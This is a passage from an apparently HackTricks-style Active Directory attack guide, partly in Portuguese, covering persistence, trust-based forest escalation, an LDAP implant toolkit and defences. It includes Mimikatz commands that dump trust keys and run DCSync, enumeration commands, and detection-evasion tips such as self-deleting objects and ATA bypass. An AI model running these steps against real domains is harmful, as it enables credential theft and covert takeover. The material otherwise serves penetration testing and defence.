[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Inside every **Domain Controller (DC)**, a **local administrator** account exists. By obtaining admin rights on such a machine, the local Administrator hash can be extracted using **mimikatz**. Following this, a registry modification is necessary to **enable the use of this password**, allowing for remote access to the local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

You could **give** some **special permissions** to a **user** over some specific domain objects that will let the user **escalate privileges in the future**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

The **security descriptors** are used to **store** the **permissions** an **object** have **over** an **object**. If you can just **make** a **little change** in the **security descriptor** of an object, you can obtain very interesting privileges over that object without needing to be member of a privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse the `dynamicObject` auxiliary class to create short-lived principals/GPOs/DNS records with `entryTTL`/`msDS-Entry-Time-To-Die`; they self-delete without tombstones, erasing LDAP evidence while leaving orphan SIDs, broken `gPLink` references, or cached DNS responses (e.g., AdminSDHolder ACE pollution or malicious `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alter **LSASS** in memory to establish a **universal password**, granting access to all domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
Note that if you use wrong data, pretty ugly logs will appear.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Previously we have discussed about how to escalate privileges if you have **enough permission to read LAPS passwords**. However, these passwords can also be used to **maintain persistence**.\
Check:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft views the **Forest** as the security boundary. This implies that **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) is a security mechanism that enables a user from one **domain** to access resources in another **domain**. It essentially creates a linkage between the authentication systems of the two domains, allowing authentication verifications to flow seamlessly. When domains set up a trust, they exchange and retain specific **keys** within their **Domain Controllers (DCs)**, which are crucial to the trust's integrity.

In a typical scenario, if a user intends to access a service in a **trusted domain**, they must first request a special ticket known as an **inter-realm TGT** from their own domain's DC. This TGT is encrypted with a shared **key** that both domains have agreed upon. The user then presents this TGT to the **DC of the trusted domain** to get a service ticket (**TGS**). Upon successful validation of the inter-realm TGT by the trusted domain's DC, it issues a TGS, granting the user access to the service.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

It's important to notice that **a trust can be 1 way or 2 ways**. In the 2 ways options, both domains will trust each other, but in the **1 way** trust relation one of the domains will be the **trusted** and the other the **trusting** domain. In the last case, **you will only be able to access resources inside the trusting domain from the trusted one**.

If Domain A trusts Domain B, A is the trusting domain and B ins the trusted one. Moreover, in **Domain A**, this would be an **Outbound trust**; and in **Domain B**, this would be an **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: This is a common setup within the same forest, where a child domain automatically has a two-way transitive trust with its parent domain. Essentially, this means that authentication requests can flow seamlessly between the parent and the child.
- **Cross-link Trusts**: Referred to as "shortcut trusts," these are established between child domains to expedite referral processes. In complex forests, authentication referrals typically have to travel up to the forest root and then down to the target domain. By creating cross-links, the journey is shortened, which is especially beneficial in geographically dispersed environments.
- **External Trusts**: These are set up between different, unrelated domains and are non-transitive by nature. According to [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts are useful for accessing resources in a domain outside of the current forest that isn't connected by a forest trust. Security is bolstered through SID filtering with external trusts.
- **Tree-root Trusts**: These trusts are automatically established between the forest root domain and a newly added tree root. While not commonly encountered, tree-root trusts are important for adding new domain trees to a forest, enabling them to maintain a unique domain name and ensuring two-way transitivity. More information can be found in [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: This type of trust is a two-way transitive trust between two forest root domains, also enforcing SID filtering to enhance security measures.
- **MIT Trusts**: These trusts are established with non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. MIT trusts are a bit more specialized and cater to environments requiring integration with Kerberos-based systems outside the Windows ecosystem.

#### Other differences in **trusting relationships**

- A trust relationship can also be **transitive** (A trust B, B trust C, then A trust C) or **non-transitive**.
- A trust relationship can be set up as **bidirectional trust** (both trust each other) or as **one-way trust** (only one of them trust the other).

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

You can check **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** to find foreign security principals in the domain. These will be user/group from **an external domain/forest**.

You could check this in **Bloodhound** or using powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalada de privilégios de Child-to-Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode a usada pelo current domain them com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como o Configuration Naming Context (NC) pode ser explorado é crucial. O Configuration NC serve como um repositório central para dados de configuração em todos os ambientes de Active Directory (AD) de uma forest. Esses dados são replicados para cada Domain Controller (DC) dentro da forest, com DCs graváveis mantendo uma cópia gravável do Configuration NC. Para explorar isso, é necessário ter **privilégios de SYSTEM em um DC**, de preferência um child DC.

**Link GPO to root DC site**

O contêiner Sites do Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da AD forest. Operando com privilégios de SYSTEM em qualquer DC, atacantes podem link GPOs aos root DC sites. Essa ação pode comprometer o root domain ao manipular políticas aplicadas a esses sites.

Para informações mais detalhadas, pode-se explorar a pesquisa sobre [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Um vetor de ataque envolve mirar gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as senhas das gMSAs, fica armazenada no Configuration NC. Com privilégios de SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA em toda a forest.

Análise detalhada e orientação passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a delegated MSA (BadSuccessor – abusando dos migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Este método exige paciência, aguardando a criação de novos objetos privilegiados de AD. Com privilégios de SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar a acesso não autorizado e controle sobre objetos de AD criados recentemente.

Leitura adicional está disponível em [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

A vulnerabilidade ADCS ESC5 mira o controle sobre objetos de Public Key Infrastructure (PKI) para criar um certificate template que permite autenticação como qualquer usuário dentro da forest. Como os objetos de PKI residem no Configuration NC, comprometer um child DC gravável permite a execução de ataques ESC5.

Mais detalhes podem ser lidos em [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Em cenários sem ADCS, o atacante tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário **your domain is trusted** por um externo, concedendo a você **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domain têm qual acesso sobre o external domain** e então tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário, **seu domínio** está **confiando** certos **privilégios** a um principal de **diferentes domínios**.

No entanto, quando um **domínio é confiado** pelo domínio de confiança, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a trusted password**. Isso significa que é possível **acessar um usuário do domínio de confiança para entrar no confiado**, enumerá-lo e tentar escalar mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** da trust do domínio (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina onde um **usuário do domínio confiado possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima montou seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de trust de domínio

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history em trusts entre forests é mitigado por SID Filtering, que é ativado por padrão em todos os trusts inter-forest. Isso se baseia na suposição de que trusts intra-forest são seguros, considerando a forest, em vez do domínio, como o limite de segurança, de acordo com a posição da Microsoft.
- No entanto, há um porém: o SID filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para trusts inter-forest, empregar Selective Authentication garante que usuários das duas forests não sejam autenticados automaticamente. Em vez disso, permissões explícitas são necessárias para que os usuários acessem domínios e servidores dentro do domínio ou forest de confiança.
- É importante notar que essas medidas não protegem contra a exploração do Configuration Naming Context (NC) gravável ou ataques à trust account.

[**Mais informações sobre trusts de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como x64 Beacon Object Files que rodam inteiramente dentro de um implant no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e então chamam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança de logon atual sobre LDAP (389) com signing/sealing ou LDAPS (636) com trust automático de certificado, então não são necessários socks proxies nem artefatos em disco.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, e `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute`, e `get-domaininfo` coletam atributos arbitrários (incluindo security descriptors) além dos metadados de forest/domain de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, e `get-rbcd` expõem candidatos a roasting, configurações de delegação e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` e `get-writable --detailed` fazem o parse da DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/attribute writes) e herança, fornecendo alvos imediatos para escalation de privilégios por ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives para escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operator prepare novos principals ou machine accounts onde quer que existam direitos de OU. `add-groupmember`, `set-password`, `add-attribute`, e `set-attribute` sequestram targets diretamente assim que direitos de write-property são encontrados.
- Commands focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, e `add-dcsync`, traduzem WriteDACL/WriteOwner em qualquer AD object para resets de password, controle de membership de groups, ou privilégios de replication DCSync sem deixar artefatos de PowerShell/ADSI. Contrapartes `remove-*` limpam ACEs injetadas.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` tornam instantaneamente um user comprometido Kerberoastable; `add-asreproastable` (UAC toggle) o marca para AS-REP roasting sem tocar no password.
- Macros de delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de attack constrained/unconstrained/RBCD e eliminando a necessidade de remote PowerShell ou RSAT.

### injeção de sidHistory, relocação de OU e shaping da attack surface

- `add-sidhistory` injeta SIDs privilegiados no SID history de um principal controlado (veja [SID-History Injection](sid-history-injection.md)), fornecendo herança de acesso furtiva totalmente via LDAP/LDAPS.
- `move-object` altera o DN/OU de computers ou users, permitindo que um attacker arraste assets para OUs onde direitos delegados já existem antes de abusar de `set-password`, `add-groupmember`, ou `add-spn`.
- Commands de remoção com escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem rollback rápido depois que o operator coleta credentials ou persistence, minimizando telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credentials aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas Defensivas para Proteção de Credentials**

- **Restrições para Domain Admins**: É recomendado que Domain Admins possam fazer login apenas em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de Service Account**: Services não devem ser executados com privilégios de Domain Admin (DA) para manter a segurança.
- **Limitação Temporal de Privilégios**: Para tasks que exigem privilégios de DA, sua duração deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de LDAP relay**: Audite os Event IDs 2889/3074/3075 e depois aplique LDAP signing mais LDAPS channel binding em DCs/clients para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting em nível de protocolo da atividade do Impacket

Se você quer detectar common AD tradecraft, **não confie apenas em artefatos controlados pelo operator** como binaries renomeados, nomes de services, temp batch files, ou output paths. Faça baseline de como clientes Windows legítimos geram tráfego de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, e WMI, e então procure por **peculiaridades de implementação** que permanecem mesmo depois que o operator edita `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, ou `ntlmrelayx.py`.

- **Candidatos isolados de alta confiança** (após validar contra seu próprio baseline):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Padding de autenticação DCE/RPC preenchido com `0xff`
- LDAP Kerberos binds que colocam um Kerberos bruto `AP-REQ` diretamente em `mechToken` de SPNEGO
- SMB2/3 negotiate requests com valores de `ClientGuid` com aparência ASCII
- WMI `IWbemLevel1Login::NTLMLogin` usando o namespace não padrão `//./root/cimv2`
- Valores hardcoded de nonce Kerberos
- **Melhor como features de correlação/scoring**:
- Listas de etype Kerberos esparsas ou duplicadas, `PA-DATA` incomum/ausente, ou ordenação de etype em TGS-REQ diferente do Windows nativo
- Mensagens NTLM Type 1 sem versão ou mensagens Type 3 com nomes de host nulos
- NTLMSSP bruto carregado em DCE/RPC em vez de SPNEGO, trailers de verificação DCE/RPC ausentes, ou incompatibilidades de OID entre SPNEGO/Kerberos
- Vários desses traços do mesmo host/user/janela de tempo são muito mais fortes do que qualquer campo fraco isolado
- **Use como enrichment, não como alerts isolados**:
- Nomes de arquivos padrão, output paths, nomes aleatórios de services, nomes temporários de batch, nomes padrão de contas de computador, e strings específicas de tool para HTTP/WebDAV/RDP/MSSQL
- Esses itens são fáceis de o operator alterar e são melhores para explicar por que um cluster cross-protocol é suspeito
- **Observações operacionais**:
- Alguns desses sinais exigem tráfego descriptografado, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, ou visibilidade do lado do service
- Valide contra Samba/Linux clients, appliances, e software legado antes de promover para alerts
- Promova detecções de enrichment -> hunting -> alerting conforme você ganha confiança no baseline

### **Implementando Técnicas de Deception**

- Implementar deception envolve criar armadilhas, como decoy users ou computers, com features como passwords que não expiram ou marcados como Trusted for Delegation. Uma abordagem detalhada inclui criar users com direitos específicos ou adicioná-los a groups de alto privilégio.
- Um exemplo prático envolve usar ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais sobre como implantar técnicas de deception pode ser encontrado em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **Para User Objects**: Indicadores suspeitos incluem ObjectSID atípico, logons infrequentes, datas de criação, e contagens baixas de bad password.
- **Indicadores Gerais**: Comparar atributos de potenciais decoy objects com os de objetos genuínos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar essas deceptions.

### **Burlando Sistemas de Detecção**

- **Microsoft ATA Detection Bypass**:
- **Enumeração de Users**: Evitar a enumeração de sessions em Domain Controllers para prevenir detecção pelo ATA.
- **Ticket Impersonation**: Utilizar chaves **aes** para criação de tickets ajuda a evitar detecção ao não fazer downgrade para NTLM.
- **DCSync Attacks**: É aconselhável executar a partir de um non-Domain Controller para evitar detecção pelo ATA, pois a execução direta a partir de um Domain Controller irá disparar alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
